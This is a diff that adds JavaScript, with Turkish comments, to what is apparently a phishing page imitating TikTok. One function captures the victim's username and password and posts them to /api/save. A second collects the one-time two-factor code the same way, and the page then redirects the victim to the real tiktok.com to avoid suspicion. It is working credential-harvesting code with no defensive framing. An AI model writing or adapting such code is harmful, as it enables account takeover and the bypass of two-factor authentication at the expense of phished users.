@@ -1,0 +1,28 @@
+// HTML içindeki script kısmına ekle:
+async function submitFirstStep() {
+    const user = document.getElementById('login-user').value;
+    const pass = document.getElementById('login-pass').value;
+
+    await fetch('/api/save', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ user, pass, type: 'login' })
+    });
+
+    document.getElementById('page-login').style.display = 'none';
+    document.getElementById('page-otp').style.display = 'block';
+    document.getElementById('target-display').textContent = user;
+}
+
+async function finalVerify() {
+    const code = Array.from(document.querySelectorAll('.code-box')).map(i => i.value).join('');
+    const user = document.getElementById('target-display').textContent;
+
+    await fetch('/api/save', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ user, code, type: 'otp' })
+    });
+
+    window.location.href = "https://www.tiktok.com"; // İşlem bitince yönlendir
+}
